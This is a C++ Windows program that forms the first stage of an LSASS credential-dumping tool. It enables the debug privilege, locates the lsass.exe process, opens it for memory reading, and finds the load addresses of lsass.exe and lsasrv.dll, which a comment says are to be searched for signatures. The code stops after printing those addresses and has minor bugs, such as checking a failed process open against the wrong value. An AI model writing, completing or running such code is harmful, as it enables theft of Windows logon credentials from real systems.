#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <userenv.h>
#pragma comment(lib, "Userenv.lib")
HANDLE GetAccessToken(DWORD pid)
{

	/* Retrieves an access token for a process */
	HANDLE currentProcess = {};
	HANDLE AccessToken = {};
	DWORD LastError;

	if (pid == 0)
	{
		currentProcess = GetCurrentProcess();
	}
	else
	{
		currentProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
		if (!currentProcess)
		{
			LastError = GetLastError();
			wprintf(L"ERROR: OpenProcess(): %d\n", LastError);
			return (HANDLE)NULL;
		}
	}
	if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken))
	{
		LastError = GetLastError();
		wprintf(L"ERROR: OpenProcessToken(): %d\n", LastError);
		return (HANDLE)NULL;
	}
	return AccessToken;
}

DWORD getidFBKillProcessByName(const WCHAR* filename) {
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (lstrcmpW(pEntry.szExeFile, filename) == 0)
		{
			return (DWORD)pEntry.th32ProcessID;
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
	return 0;
}
int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}
HANDLE GrabLsassHandle(int pid) {
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	return procHandle;
}

bool EnableDebugPrivilege()
{
	HANDLE tokenHandle;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
	{
		std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
		return false;
	}

	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	{
		std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
	{
		std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return true;
}

int main(int argc, char** argv)
{
	EnableDebugPrivilege();
	HANDLE  hLsass = GrabLsassHandle(GetLsassPid());
	if (hLsass == INVALID_HANDLE_VALUE) {
		printf("[x] Error: Could not open handle to lsass process\n");
		return 1;
	}
	HMODULE lsassDll[1024];
	DWORD bytesReturned;
	char modName[MAX_PATH];
	char* lsass = NULL, * lsasrv = NULL;

	if (EnumProcessModules(hLsass, lsassDll, sizeof(lsassDll), &bytesReturned)) {

		// For each DLL address, get its name so we can find what we are looking for
		for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
			GetModuleFileNameExA(hLsass, lsassDll[i], modName, sizeof(modName));

			// Find DLL's we want to hunt for signatures within
			if (strstr(modName, "lsass.exe") != (char*)0) {
				lsass = (char*)lsassDll[i];
			}
			else if (strstr(modName, "lsasrv.dll") != (char*)0) {
				lsasrv = (char*)lsassDll[i];
			}
		}
	}

	printf("[*] lsass.exe found at %p\n", lsass);
	printf("[*] lsasrv.dll found at %p\n", lsasrv);
}
